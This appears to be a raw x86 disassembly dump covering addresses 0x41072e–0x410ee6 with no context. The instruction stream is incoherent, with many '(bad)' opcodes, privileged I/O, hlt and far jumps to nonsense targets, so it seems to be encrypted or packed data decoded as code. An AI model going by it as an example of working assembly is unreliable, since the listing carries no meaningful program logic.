  41072e:	arpl   WORD PTR [ebx-0x45315fc9],sp
  410734:	jg     0x4106d3
  410736:	in     eax,dx
  410737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410738:	fiadd  DWORD PTR [eax+0x28]
  41073c:	or     eax,0xf42fa54a
  410741:	les    edi,FWORD PTR [edi+0x7a13d050]
  410747:	dec    ebp
  410748:	sbb    bh,BYTE PTR ds:0xb884712d
  41074e:	imul   ebp,DWORD PTR [esi+0x73],0x1
  410752:	adc    cl,dl
  410754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410755:	fnstsw WORD PTR [ebp-0x23]
  410758:	mov    al,0xdf
  41075a:	and    eax,0x6a83e1e8
  41075f:	dec    ebx
  410760:	mov    al,BYTE PTR [ebp+0x74]
  410763:	mov    ds:0x5f0580b9,al
  410768:	pop    ebx
  410769:	and    DWORD PTR [ecx+0x5ff07034],ebx
  41076f:	jl     0x4107cb
  410771:	sbb    dh,bh
  410773:	cmp    DWORD PTR [edx-0x42819dae],ebp
  410779:	xor    eax,DWORD PTR [edi-0x346f214]
  41077f:	push   esi
  410780:	adc    cl,ch
  410782:	or     BYTE PTR [esi+0xd1b8e63],ah
  410788:	dec    ebp
  410789:	push   edi
  41078a:	loopne 0x410769
  41078c:	mov    cl,0x73
  41078e:	mov    ebp,0xdef07e5
  410793:	xor    bl,dl
  410795:	in     al,0x7e
  410797:	sbb    bl,BYTE PTR [ecx+edi*1-0xc]
  41079b:	pop    ss
  41079c:	ins    BYTE PTR es:[edi],dx
  41079d:	mov    esp,0xee2292b5
  4107a2:	xor    bl,BYTE PTR [eax+edx*2+0x1b96da8d]
  4107a9:	(bad)  
  4107ab:	shl    DWORD PTR ds:0x13a77d5b,1
  4107b1:	in     al,dx
  4107b2:	mov    dl,0xc7
  4107b4:	dec    ecx
  4107b5:	adc    ah,ch
  4107b7:	aam    0x8a
  4107b9:	mov    ecx,0x6f16cb58
  4107be:	mov    dl,0x5e
  4107c0:	clc    
  4107c1:	inc    esi
  4107c2:	loopne 0x410768
  4107c4:	ds dec esp
  4107c6:	imul   edx,esp,0x6
  4107c9:	push   ds
  4107ca:	cmp    al,0x75
  4107cc:	sbb    al,0x5a
  4107ce:	xchg   BYTE PTR [eax],al
  4107d0:	es inc ebp
  4107d2:	mov    edx,0x9638551c
  4107d7:	pop    es
  4107d8:	lea    edx,[edi]
  4107da:	xchg   esp,eax
  4107db:	jae    0x4107c1
  4107dd:	ror    BYTE PTR [ebp-0x79],1
  4107e0:	or     eax,0x1378ac6
  4107e5:	sub    BYTE PTR [ecx-0x2c72ff62],ah
  4107eb:	sub    DWORD PTR [eax],ebp
  4107ed:	into   
  4107ee:	sub    ebx,DWORD PTR [esi+0xa]
  4107f1:	(bad)  
  4107f2:	push   0xffffffc3
  4107f4:	mov    eax,0xff681dae
  4107f9:	or     dh,bh
  4107fb:	jnp    0x41079d
  4107fd:	pop    edx
  4107fe:	pop    eax
  4107ff:	cwde   
  410800:	xchg   ecx,eax
  410801:	cmp    BYTE PTR [edx+ebp*2],cl
  410804:	dec    edi
  410805:	cs dec edx
  410807:	mov    dl,0xcb
  410809:	push   eax
  41080a:	xchg   BYTE PTR [ecx+0x31bf2929],dl
  410810:	test   eax,0xcee51dd8
  410815:	adc    dl,0xad
  410818:	inc    edx
  410819:	scas   eax,DWORD PTR es:[edi]
  41081a:	call   0x9fe:0x1d772ffc
  410821:	sub    bl,BYTE PTR [ebx+0x4c641a74]
  410827:	test   BYTE PTR [ecx+0x2],bl
  41082a:	mov    edx,0x84e5a3a3
  41082f:	rol    BYTE PTR [edx+esi*8],1
  410832:	jno    0x410837
  410834:	jp     0x410862
  410836:	fcomp  QWORD PTR [edx+0x30ab7b92]
  41083c:	addr16 add al,dl
  41083f:	pop    ss
  410840:	fsubp  st(0),st
  410842:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410843:	sbb    dh,BYTE PTR [ebx]
  410845:	xchg   edx,eax
  410846:	add    eax,DWORD PTR [esi+0x6e]
  410849:	das    
  41084a:	sbb    DWORD PTR [edi],esi
  41084c:	xor    eax,0x68926e45
  410851:	shr    DWORD PTR [edi],1
  410853:	int3   
  410854:	in     eax,dx
  410855:	dec    esp
  410856:	fyl2x  
  410858:	aam    0x64
  41085a:	adc    esi,DWORD PTR [edx+0x63fd3c4a]
  410860:	sbb    eax,0x1e94058d
  410865:	jmp    0x3ba2331
  41086a:	pop    edx
  41086b:	xor    edx,DWORD PTR [ecx-0x50236375]
  410871:	fwait
  410872:	push   ecx
  410873:	pop    ebx
  410874:	mov    ch,0x5e
  410876:	adc    ch,BYTE PTR [esi]
  410878:	pop    esp
  410879:	shl    DWORD PTR [ecx],0x47
  41087c:	sbb    bl,BYTE PTR [ebx+0x49]
  41087f:	in     al,0x41
  410881:	aaa    
  410882:	std    
  410883:	xchg   ebx,eax
  410884:	mov    ebp,0x84a63655
  410889:	dec    esi
  41088a:	pusha  
  41088b:	sbb    esi,DWORD PTR [edi-0x45673830]
  410891:	popf   
  410892:	add    ebx,DWORD PTR [eax+0x7c]
  410895:	push   edi
  410896:	test   edx,eax
  410898:	call   0xeca3cb12
  41089d:	mov    eax,ds:0xf1a065c
  4108a2:	cmp    BYTE PTR [ecx+0x72],bl
  4108a5:	pop    edx
  4108a6:	bound  esp,QWORD PTR [ebp-0x2864742d]
  4108ac:	repnz int3 
  4108ae:	mov    dl,0xda
  4108b0:	jbe    0x4108f0
  4108b2:	lock cmp ebp,DWORD PTR [esi]
  4108b5:	jle    0x410897
  4108b7:	pop    edx
  4108b8:	xor    DWORD PTR [ecx],ebx
  4108ba:	jns    0x410933
  4108bc:	repz mov esi,0x113a586f
  4108c2:	es and bh,ah
  4108c5:	sub    dh,BYTE PTR [esi-0x7a]
  4108c8:	add    bh,BYTE PTR [esi]
  4108ca:	and    BYTE PTR [edi+eax*8-0x13],0xe6
  4108cf:	push   esp
  4108d0:	repz jno 0x41091e
  4108d3:	adc    al,0x17
  4108d5:	test   esi,eax
  4108d7:	xor    al,0x54
  4108d9:	push   es
  4108da:	test   al,0x5
  4108dc:	push   ebp
  4108dd:	sub    cl,bh
  4108df:	aas    
  4108e0:	loopne 0x41093e
  4108e2:	fidiv  DWORD PTR [edi-0x18]
  4108e5:	hlt    
  4108e6:	xchg   esp,esi
  4108e8:	inc    edx
  4108e9:	sbb    BYTE PTR [esi-0x56eed2d2],0x77
  4108f0:	mov    dh,0x95
  4108f2:	sbb    esi,0x3b
  4108f5:	or     dl,dh
  4108f7:	adc    al,0x3d
  4108f9:	add    al,0xad
  4108fb:	sti    
  4108fc:	add    al,dl
  4108fe:	xor    al,0xf5
  410900:	inc    edx
  410901:	(bad)  
  410902:	aaa    
  410903:	or     al,0x8f
  410905:	jne    0x410961
  410907:	(bad)  
  410908:	arpl   WORD PTR [esi+0x3729849a],sp
  41090e:	mov    ebp,0xacb8f813
  410913:	retf   
  410914:	jl     0x41093d
  410916:	add    al,0x3f
  410918:	jb     0x410918
  41091a:	xlat   BYTE PTR ds:[ebx]
  41091b:	push   cs
  41091c:	xor    ebp,0xffffffc9
  41091f:	ror    DWORD PTR [esi+0x23be9305],cl
  410925:	lods   eax,DWORD PTR ds:[esi]
  410926:	mov    ch,0xa8
  410928:	repnz inc ebp
  41092a:	imul   eax,ebx,0x58
  41092d:	xlat   BYTE PTR ds:[ebx]
  41092e:	sub    al,BYTE PTR [ebx+0x7f08a6ae]
  410934:	or     DWORD PTR [esp+ecx*2+0x25],ebx
  410938:	adc    eax,0xabc69391
  41093d:	fld    TBYTE PTR [ecx+esi*4-0x36]
  410941:	(bad)  
  410942:	adc    al,0xe1
  410944:	jns    0x4109a9
  410946:	mov    al,0xb8
  410948:	jo     0x4109b7
  41094a:	dec    eax
  41094b:	dec    ebx
  41094c:	jno    0x4108de
  41094e:	push   cs
  41094f:	jno    0x41094e
  410951:	lock aam 0x5c
  410954:	enter  0x4562,0xfa
  410958:	push   0x3f35789a
  41095d:	xlat   BYTE PTR ds:[ebx]
  41095e:	xor    al,0x9a
  410960:	lock popf 
  410962:	xchg   ecx,eax
  410963:	cmp    al,0x4e
  410965:	jl     0x4109aa
  410967:	xlat   BYTE PTR ds:[ebx]
  410968:	les    esi,FWORD PTR [edx-0x4f]
  41096b:	out    dx,al
  41096c:	jnp    0x41098b
  41096e:	enter  0x1377,0x16
  410972:	mov    esp,0x4950f723
  410977:	das    
  410978:	addr16 sbb dl,ah
  41097b:	mov    bh,0x21
  41097d:	inc    esi
  41097e:	icebp  
  41097f:	ins    DWORD PTR es:[edi],dx
  410980:	ds push edx
  410982:	test   al,0x11
  410984:	pop    ss
  410985:	out    dx,eax
  410986:	lock dec esi
  410988:	imul   eax,DWORD PTR [edx+0x25],0xdec492e2
  41098f:	(bad)  
  410990:	je     0x4109cf
  410992:	ss dec ebx
  410994:	adc    edx,esi
  410996:	mov    bh,dh
  410998:	ror    DWORD PTR [ecx+0x64],0x77
  41099c:	cld    
  41099d:	aam    0xf3
  41099f:	sbb    DWORD PTR [edi+edx*4],esi
  4109a2:	ret    
  4109a3:	sar    DWORD PTR [edx+0x2ed08cff],1
  4109a9:	jno    0x41098a
  4109ab:	retf   0xd9ed
  4109ae:	pop    ss
  4109af:	jecxz  0x410a22
  4109b1:	mov    al,0x32
  4109b3:	test   bl,cl
  4109b5:	or     eax,0x9a58a59d
  4109ba:	dec    ebp
  4109bb:	and    al,0x4d
  4109bd:	lds    edi,FWORD PTR [esi]
  4109bf:	je     0x410946
  4109c1:	das    
  4109c2:	or     cl,BYTE PTR [ecx]
  4109c4:	aam    0x89
  4109c6:	push   ecx
  4109c7:	ds dec ebp
  4109c9:	sbb    BYTE PTR [ebx-0x466c80ff],0x1c
  4109d0:	add    DWORD PTR [edi+0x39],ebx
  4109d3:	test   eax,0xdd24a5d9
  4109d8:	ins    BYTE PTR es:[edi],dx
  4109d9:	fld    QWORD PTR [edi+esi*2+0x4b448cba]
  4109e0:	cwde   
  4109e1:	pushf  
  4109e2:	lahf   
  4109e3:	inc    esi
  4109e4:	fsubr  st,st(1)
  4109e6:	sar    edx,0xa6
  4109e9:	rcl    bl,0xec
  4109ec:	fcom   st(7)
  4109ee:	(bad)  [esi+0x34dc9ccc]
  4109f4:	pop    edi
  4109f5:	adc    al,0x23
  4109f7:	outs   dx,BYTE PTR ds:[esi]
  4109f8:	mov    cl,0xa
  4109fa:	pop    ss
  4109fb:	imul   esp,DWORD PTR [ecx+0x13],0x71
  4109ff:	adc    edi,esi
  410a01:	sbb    BYTE PTR [ebp-0x6c2ca91f],cl
  410a07:	mov    dl,0xaa
  410a09:	push   ss
  410a0a:	mov    bh,0x2d
  410a0c:	pop    ds
  410a0d:	out    0xd0,al
  410a0f:	inc    ebx
  410a10:	mov    ch,0x49
  410a12:	xor    eax,0x4d400bb5
  410a17:	mov    al,0x76
  410a19:	lahf   
  410a1a:	mov    eax,DWORD PTR [edx]
  410a1c:	mov    ecx,0xaae3b6f1
  410a21:	push   cs
  410a22:	sbb    BYTE PTR [ebx-0x9],0xb
  410a26:	into   
  410a27:	mov    al,0x1f
  410a29:	xchg   edi,eax
  410a2a:	sbb    ah,ah
  410a2c:	les    ecx,FWORD PTR [esi+ebx*4+0x6fc68fbc]
  410a33:	clc    
  410a34:	sub    ebp,DWORD PTR [edx+0x45a1cd3a]
  410a3a:	in     al,0xf5
  410a3c:	gs mov ebx,0x88e6da4c
  410a42:	xchg   BYTE PTR [esi+0x560b6614],dl
  410a48:	fldenv [ebx]
  410a4a:	mov    dl,0x92
  410a4c:	jmp    0x410aa0
  410a4e:	push   es
  410a4f:	bound  ebp,QWORD PTR [esi+0xd]
  410a52:	add    edx,ebp
  410a54:	xchg   edx,eax
  410a55:	mov    edi,0x3ead5920
  410a5a:	das    
  410a5b:	test   BYTE PTR [edi],dh
  410a5d:	(bad)  
  410a5e:	outs   dx,BYTE PTR ds:[esi]
  410a5f:	fcomi  st,st(0)
  410a61:	daa    
  410a62:	enter  0x6dab,0x6b
  410a66:	sar    BYTE PTR [eax+0x5b3d99dc],0x60
  410a6d:	pop    ebx
  410a6e:	ss jbe 0x410aaf
  410a71:	pop    esp
  410a72:	bound  ebp,QWORD PTR [eax-0x15]
  410a75:	push   ebp
  410a76:	retf   0xb8fa
  410a79:	xchg   esi,eax
  410a7a:	ja     0x410a0a
  410a7c:	(bad)  
  410a7d:	das    
  410a7e:	bound  edi,QWORD PTR [ecx-0x7744006d]
  410a84:	mov    esi,0x4611e8
  410a89:	fild   DWORD PTR ds:0x703a2b3f
  410a8f:	popaw  
  410a91:	fcom   DWORD PTR [edx+0x0]
  410a94:	sbb    al,0x19
  410a96:	xchg   esp,eax
  410a97:	push   cs
  410a98:	sahf   
  410a99:	loope  0x410a47
  410a9b:	add    al,0x45
  410a9d:	adc    DWORD PTR [edi],0x1b846f99
  410aa3:	leave  
  410aa4:	xor    bl,BYTE PTR [ecx+esi*2-0x6a9dbcf9]
  410aab:	fist   DWORD PTR ds:0xd624656b
  410ab1:	fadd   DWORD PTR [edx]
  410ab3:	adc    esi,ebp
  410ab5:	cmp    BYTE PTR [eax+0xe],bl
  410ab8:	add    cl,bl
  410aba:	xor    ebp,DWORD PTR [edi+0x7]
  410abd:	shr    BYTE PTR [ecx+0x40],cl
  410ac0:	pop    ds
  410ac1:	cmp    DWORD PTR ds:0x4b675c1b,edx
  410ac7:	and    eax,0xd57feb0
  410acc:	fistp  DWORD PTR [eax+0x3c]
  410acf:	adc    eax,DWORD PTR [di+0x67]
  410ad3:	mov    eax,0x7609a6ea
  410ad8:	ficom  WORD PTR [esi-0x55]
  410adb:	mov    dh,0xca
  410add:	jg     0x410af7
  410adf:	rol    DWORD PTR [edx-0x6b],1
  410ae2:	aaa    
  410ae3:	ret    0xd802
  410ae6:	mov    ch,al
  410ae8:	ss pop es
  410aea:	pop    esp
  410aeb:	cwde   
  410aec:	fnstcw WORD PTR [edx+0x339cc529]
  410af2:	ret    0xf6d1
  410af5:	scas   al,BYTE PTR es:[edi]
  410af6:	(bad)  
  410af7:	clc    
  410af8:	sbb    cl,BYTE PTR [ecx-0x3efaea48]
  410afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410aff:	sbb    dl,BYTE PTR [edi]
  410b01:	adc    dh,ch
  410b03:	jae    0x410ad1
  410b05:	adc    eax,0xa7807c91
  410b0a:	int3   
  410b0b:	pop    ds
  410b0c:	and    al,BYTE PTR [eax+0x6b]
  410b0f:	cmc    
  410b10:	ds ds out 0xb9,eax
  410b14:	in     al,0x2f
  410b16:	and    DWORD PTR [esi+0x3b535700],ecx
  410b1c:	mov    ds:0xb07ddb12,eax
  410b21:	sti    
  410b22:	mov    bl,0xc3
  410b24:	mov    esp,0xfa5330ed
  410b29:	cmp    edi,edi
  410b2b:	push   ebp
  410b2c:	mov    dh,0xd0
  410b2e:	das    
  410b2f:	test   DWORD PTR [edx-0x7546eb49],0xa5677fa8
  410b39:	jl     0x410b1d
  410b3b:	jae    0x410b14
  410b3d:	in     al,dx
  410b3e:	or     BYTE PTR [eax-0x1b0e4004],0x60
  410b45:	fidiv  WORD PTR [eax+edx*4]
  410b48:	jo     0x410b74
  410b4a:	jl     0x410aeb
  410b4c:	loop   0x410adc
  410b4e:	cmp    DWORD PTR [edx],esp
  410b50:	fst    QWORD PTR ds:0xbacb1dbc
  410b56:	mov    bl,0xe0
  410b58:	int3   
  410b59:	lods   al,BYTE PTR ds:[esi]
  410b5a:	mov    bh,0x2a
  410b5c:	jg     0x410b52
  410b5e:	lods   eax,DWORD PTR ds:[esi]
  410b5f:	stc    
  410b60:	pop    ebp
  410b61:	addr16 dec ebp
  410b63:	(bad)  
  410b64:	repnz adc edx,edx
  410b67:	pop    edx
  410b68:	sbb    DWORD PTR [ecx+0x32],esp
  410b6b:	sub    eax,ecx
  410b6d:	mov    dh,0x61
  410b6f:	nop
  410b70:	jle    0x410b7d
  410b72:	call   0xac7d80a8
  410b77:	mov    dh,0xce
  410b79:	das    
  410b7a:	jae    0x410b6d
  410b7c:	and    BYTE PTR [edx-0x1c],0x70
  410b80:	cmp    ecx,DWORD PTR [eax]
  410b82:	int    0xf1
  410b84:	add    eax,0xaf921c49
  410b89:	or     BYTE PTR [esi+esi*4-0x23],ah
  410b8d:	inc    ebp
  410b8e:	mov    dh,0x2a
  410b90:	pop    edi
  410b91:	fnstcw WORD PTR [eax-0x441d44c9]
  410b97:	and    eax,0x87bd1a0b
  410b9c:	and    edx,DWORD PTR [ecx-0x79d61846]
  410ba2:	lock push ecx
  410ba4:	(bad)  
  410ba5:	imul   DWORD PTR [eax+edx*4+0x4e]
  410ba9:	call   0x1c1b:0x7557df69
  410bb0:	jno    0x410b97
  410bb2:	das    
  410bb3:	mov    cl,BYTE PTR [edi+0x4e7de47c]
  410bb9:	push   edi
  410bba:	cdq    
  410bbb:	arpl   ax,sp
  410bbd:	sahf   
  410bbe:	repz mov bh,BYTE PTR [edi-0x35]
  410bc2:	mov    ds:0x58b29de7,al
  410bc7:	fimul  DWORD PTR [edx+0x2f]
  410bcb:	xlat   BYTE PTR ds:[ebx]
  410bcc:	mov    eax,ds:0xa6192944
  410bd1:	mov    ebx,0xdb52ff75
  410bd6:	fisttp QWORD PTR [ecx+0x13]
  410bd9:	pop    es
  410bda:	pop    esi
  410bdb:	aad    0xc9
  410bdd:	or     DWORD PTR [esi+edx*1-0xd4efed3],edi
  410be4:	std    
  410be5:	cmp    cl,ch
  410be7:	xor    al,cl
  410be9:	mov    ebx,0xd99cb483
  410bee:	pop    ebx
  410bef:	dec    ebp
  410bf0:	and    eax,0xacadb1c
  410bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bf6:	push   ecx
  410bf7:	inc    eax
  410bf8:	rcr    DWORD PTR [ecx],0xd9
  410bfb:	sbb    dh,BYTE PTR [ecx-0x15a2b5aa]
  410c01:	mov    ebx,0xc08df560
  410c06:	frstor [eax]
  410c08:	aad    0x14
  410c0a:	cld    
  410c0b:	pusha  
  410c0c:	xor    DWORD PTR [edx],edi
  410c0e:	ss dec esi
  410c10:	sub    al,0x8d
  410c12:	inc    esi
  410c13:	in     al,0x30
  410c15:	(bad)  
  410c16:	adc    BYTE PTR [edx-0x621c0f8d],cl
  410c1c:	test   DWORD PTR [eax+0x29941970],ecx
  410c22:	sbb    eax,0x7397fda7
  410c27:	xchg   esi,eax
  410c28:	hlt    
  410c29:	push   ds
  410c2a:	je     0x410c72
  410c2c:	dec    esi
  410c2d:	dec    esi
  410c2e:	xlat   BYTE PTR ds:[ebx]
  410c2f:	dec    edx
  410c30:	ficomp DWORD PTR [eax-0xb]
  410c33:	pop    esi
  410c34:	ror    eax,1
  410c36:	pop    es
  410c37:	mov    dh,dl
  410c39:	in     eax,dx
  410c3a:	xchg   ebp,eax
  410c3b:	pop    ss
  410c3c:	(bad)
  410c40:	hlt    
  410c41:	stc    
  410c42:	lock fwait
  410c44:	ds push ecx
  410c46:	add    DWORD PTR [ebp+ecx*1-0x15a06b10],ecx
  410c4d:	pop    ss
  410c4e:	xor    ch,dl
  410c50:	test   ecx,edx
  410c52:	(bad)  
  410c54:	add    al,0x58
  410c56:	pop    edi
  410c57:	out    0x5d,al
  410c59:	push   esp
  410c5a:	mov    ah,0x10
  410c5c:	test   eax,0x5ce440f3
  410c61:	pusha  
  410c62:	scas   al,BYTE PTR es:[edi]
  410c63:	ror    BYTE PTR [ecx+edx*4],0xc1
  410c67:	pop    ss
  410c68:	call   0x30e2:0xfe277eb0
  410c6f:	mov    ebp,DWORD PTR [ebp*2-0x2d87c47]
  410c76:	test   eax,0x199f5fbb
  410c7b:	lahf   
  410c7c:	outs   dx,DWORD PTR ds:[esi]
  410c7d:	stc    
  410c7e:	pusha  
  410c7f:	push   ebx
  410c80:	retf   0xa38b
  410c83:	stc    
  410c84:	out    0xc1,eax
  410c86:	(bad)  
  410c87:	jge    0x410c47
  410c89:	sub    cl,BYTE PTR [eax+0x25]
  410c8c:	add    edi,DWORD PTR [ecx-0x5896c42d]
  410c92:	inc    eax
  410c93:	dec    esp
  410c94:	xor    al,0x3d
  410c96:	js     0x410cd7
  410c98:	jne    0x410c55
  410c9a:	sbb    edi,DWORD PTR ds:0x6a2f884d
  410ca0:	and    BYTE PTR [ebp-0x76],cl
  410ca3:	icebp  
  410ca4:	and    eax,0xccfdaed1
  410ca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410caa:	sub    DWORD PTR [edi-0x6b],0x91da97c4
  410cb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cb2:	retf   
  410cb3:	jmp    0xea43aed9
  410cb8:	ins    DWORD PTR es:[edi],dx
  410cb9:	mov    ds:0x2e7e2fd2,eax
  410cbe:	xor    bl,BYTE PTR [ecx-0x250f2e62]
  410cc4:	pop    ds
  410cc5:	mov    dh,ch
  410cc7:	xchg   ebx,eax
  410cc8:	add    ah,BYTE PTR [eax+0x3f]
  410ccb:	fwait
  410ccc:	sar    BYTE PTR [edx],1
  410cce:	push   edi
  410ccf:	sbb    eax,0x4e2028c
  410cd4:	mov    eax,ds:0xbfc1c022
  410cd9:	stc    
  410cda:	cwde   
  410cdb:	xchg   ebx,eax
  410cdc:	mov    ds:0x3fdfc538,eax
  410ce1:	(bad)  
  410ce2:	push   eax
  410ce3:	pop    ebp
  410ce4:	jmp    0xedbb:0xec28b2ec
  410ceb:	rcl    DWORD PTR [eax],1
  410ced:	icebp  
  410cee:	dec    ecx
  410cef:	retf   0x57f3
  410cf2:	arpl   WORD PTR [edi+0x55],cx
  410cf5:	pop    esi
  410cf6:	sbb    al,0x61
  410cf8:	inc    ebp
  410cf9:	inc    eax
  410cfa:	xor    ecx,edi
  410cfc:	sbb    eax,0x7602f831
  410d01:	pop    esi
  410d02:	sar    DWORD PTR [esi+ecx*1],cl
  410d05:	jae    0x410d25
  410d07:	pop    edi
  410d08:	test   BYTE PTR [edi-0x64],ah
  410d0b:	pop    ebx
  410d0c:	nop
  410d0d:	lods   eax,DWORD PTR ds:[esi]
  410d0e:	pop    ebx
  410d0f:	push   ebx
  410d10:	pop    eax
  410d11:	into   
  410d12:	mov    eax,0x33375609
  410d17:	daa    
  410d18:	pop    ss
  410d19:	jl     0x410cbb
  410d1b:	lea    edx,[esi+edx*2]
  410d1e:	fwait
  410d1f:	cmp    DWORD PTR [ebp+0x3fd07995],esi
  410d25:	out    dx,al
  410d26:	imul   ebp,DWORD PTR [edx],0xc30f796a
  410d2c:	mov    dh,0x4e
  410d2e:	push   cs
  410d2f:	adc    cl,BYTE PTR [edx]
  410d31:	pop    ebx
  410d32:	xor    BYTE PTR [edi+0x3d],al
  410d35:	jecxz  0x410d7a
  410d37:	sub    eax,0xd5fc29ac
  410d3c:	pop    ss
  410d3d:	dec    ecx
  410d3e:	rcl    BYTE PTR [edi+eiz*4+0xb],cl
  410d42:	push   edx
  410d43:	push   ebx
  410d44:	dec    edx
  410d45:	rcl    BYTE PTR [edi+eiz*2-0x1d50a1fa],cl
  410d4c:	jno    0x410d13
  410d4e:	mov    ah,BYTE PTR [eax-0x1a17d01f]
  410d54:	fsubr  DWORD PTR [ebx]
  410d56:	rcl    ecx,1
  410d58:	cwde   
  410d59:	inc    edx
  410d5a:	loopne 0x410d83
  410d5c:	aam    0xc
  410d5e:	add    BYTE PTR [edx],ah
  410d60:	xchg   ecx,eax
  410d61:	sahf   
  410d62:	xchg   edi,eax
  410d63:	pop    esp
  410d64:	imul   edi,DWORD PTR [esi+0x2081b73f],0xffffffc4
  410d6b:	cmp    ch,BYTE PTR [ecx+0x4b7431a0]
  410d71:	xor    eax,0x5d3fa763
  410d76:	sbb    DWORD PTR [ecx+eiz*2+0x3fe47a6e],esi
  410d7d:	fild   QWORD PTR [edx]
  410d7f:	mov    al,ds:0x64538b00
  410d84:	pushf  
  410d85:	xchg   edi,eax
  410d86:	paddsw mm6,QWORD PTR [ecx]
  410d89:	lahf   
  410d8a:	(bad)  
  410d8b:	aad    0x2c
  410d8d:	jmp    0x410db5
  410d8f:	(bad)  
  410d91:	sub    edi,edi
  410d93:	xchg   dl,bl
  410d95:	cdq    
  410d96:	or     BYTE PTR [ebp+0x48],ah
  410d99:	push   ss
  410d9a:	hlt    
  410d9b:	lds    ecx,FWORD PTR [eax]
  410d9d:	mov    BYTE PTR [esi],dl
  410d9f:	pop    ecx
  410da0:	xlat   BYTE PTR ds:[ebx]
  410da1:	and    DWORD PTR [edx+0x79],ebx
  410da4:	rcr    BYTE PTR [ebx+eiz*8-0x27],cl
  410da8:	outs   dx,BYTE PTR ds:[esi]
  410da9:	xchg   edi,eax
  410daa:	rcr    edx,1
  410dac:	leave  
  410dad:	pop    ss
  410dae:	pop    es
  410daf:	aaa    
  410db0:	pop    ss
  410db1:	jbe    0x410e0c
  410db3:	sub    ah,BYTE PTR [ebx]
  410db5:	arpl   WORD PTR [edx],ax
  410db7:	mov    bh,0xa7
  410db9:	jmp    0x3417:0x96e41fd8
  410dc0:	push   es
  410dc1:	sub    dl,ah
  410dc3:	out    0xa4,al
  410dc5:	pusha  
  410dc6:	xor    BYTE PTR [esi+0x2374a149],ah
  410dcc:	dec    eax
  410dcd:	xchg   esi,eax
  410dce:	inc    esi
  410dcf:	scas   al,BYTE PTR es:[edi]
  410dd0:	outs   dx,BYTE PTR ds:[esi]
  410dd1:	stos   DWORD PTR es:[edi],eax
  410dd2:	sbb    al,dh
  410dd4:	mov    ds,WORD PTR [ecx+0x70]
  410dd7:	sbb    DWORD PTR [edx-0x34],0x37
  410ddb:	rcr    BYTE PTR [edi+0x2f],cl
  410dde:	or     al,BYTE PTR [edx+0x67]
  410de1:	cs and eax,0xe1a9cbea
  410de7:	mov    BYTE PTR [edi-0x7e6c85ad],al
  410ded:	adc    BYTE PTR [eax],dl
  410def:	into   
  410df0:	in     al,dx
  410df1:	pop    es
  410df2:	and    eax,0x279a8d58
  410df7:	and    eax,0xcbb44d84
  410dfc:	mov    eax,ds:0xb49a72c1
  410e01:	dec    esi
  410e02:	adc    al,0x66
  410e04:	pop    edi
  410e05:	sub    BYTE PTR [esi-0x3c29dd2e],0xf8
  410e0c:	addr16 ret 0x93f6
  410e10:	sub    eax,0xe36ad53c
  410e15:	mov    bl,0x9f
  410e17:	int    0x37
  410e19:	bound  edx,QWORD PTR [edx+esi*8-0x80]
  410e1d:	xchg   BYTE PTR [ecx],dh
  410e1f:	gs dec ecx
  410e21:	mov    cl,0xa9
  410e23:	arpl   sp,di
  410e25:	push   es
  410e26:	aam    0xfd
  410e28:	mov    bh,0x56
  410e2a:	mov    ah,0x1f
  410e2c:	mov    al,ds:0x6ec674a8
  410e31:	popa   
  410e32:	shr    esi,1
  410e34:	addr16 in eax,dx
  410e36:	push   ecx
  410e37:	and    al,0xc8
  410e39:	mov    bl,0x5c
  410e3b:	push   es
  410e3c:	fisub  DWORD PTR [ebx]
  410e3e:	jnp    0x410dc7
  410e40:	push   ecx
  410e41:	je     0x410e27
  410e43:	sub    al,0xf8
  410e45:	ror    DWORD PTR [eax+esi*1-0x1a],1
  410e49:	push   ebp
  410e4a:	sub    eax,esp
  410e4c:	jmp    0x6750:0x7fa81740
  410e53:	jnp    0x410e08
  410e55:	outs   dx,BYTE PTR ds:[esi]
  410e56:	dec    ebp
  410e57:	ss dec edi
  410e59:	bound  esp,QWORD PTR [eax+ecx*8]
  410e5c:	lahf   
  410e5d:	out    0x2c,al
  410e5f:	stos   BYTE PTR es:[edi],al
  410e60:	loopne 0x410e52
  410e62:	jecxz  0x410e4e
  410e64:	mov    DWORD PTR [edi],ecx
  410e66:	adc    ch,BYTE PTR [esi+eiz*2]
  410e69:	add    DWORD PTR [ebx],eax
  410e6b:	stos   BYTE PTR es:[edi],al
  410e6c:	pop    edi
  410e6d:	sub    ah,dh
  410e6f:	inc    ecx
  410e70:	and    edi,DWORD PTR [ecx-0x43]
  410e73:	aam    0x17
  410e75:	jae    0x410eb1
  410e77:	inc    edi
  410e78:	inc    esi
  410e79:	or     esi,ebx
  410e7b:	inc    edx
  410e7c:	rcr    DWORD PTR [esi],cl
  410e7e:	sub    edx,ecx
  410e80:	and    esi,DWORD PTR [ebp+0x7913df48]
  410e86:	into   
  410e87:	inc    eax
  410e88:	pop    ds
  410e89:	sbb    eax,0x1e5637c2
  410e8e:	pop    ds
  410e8f:	or     esi,DWORD PTR gs:[ecx-0x841a33]
  410e96:	sti    
  410e97:	sahf   
  410e98:	inc    edi
  410e99:	mov    WORD PTR [ecx],ss
  410e9b:	inc    ebx
  410e9c:	mov    eax,gs:0xf498e38
  410ea2:	js     0x410e66
  410ea4:	xchg   esp,eax
  410ea5:	mov    dh,0x3d
  410ea7:	imul   edi,eax,0xa2dc6868
  410ead:	sbb    bl,0x23
  410eb0:	jge    0x410f31
  410eb2:	aas    
  410eb3:	mov    dh,0x23
  410eb5:	push   ebx
  410eb6:	mov    ch,BYTE PTR [edi]
  410eb8:	stos   DWORD PTR es:[edi],eax
  410eb9:	xor    al,0xfa
  410ebb:	xchg   edi,eax
  410ebc:	data16 jg 0x410f33
  410ebf:	mov    bl,ah
  410ec1:	ds aad 0xb1
  410ec4:	fs xchg ebx,eax
  410ec6:	adc    eax,0x2a077471
  410ecb:	retf   0xd2e3
  410ece:	sar    BYTE PTR [eax+0x459cc45b],1
  410ed4:	xchg   ecx,eax
  410ed5:	rcl    DWORD PTR [edi],0xe8
  410ed8:	xor    al,0x12
  410eda:	iret   
  410edb:	out    dx,eax
  410edc:	push   ds
  410edd:	mov    ebx,DWORD PTR [esp+ebx*2+0x3b]
  410ee1:	or     eax,0xbc272345
  410ee6:	jecxz  0x410eb4
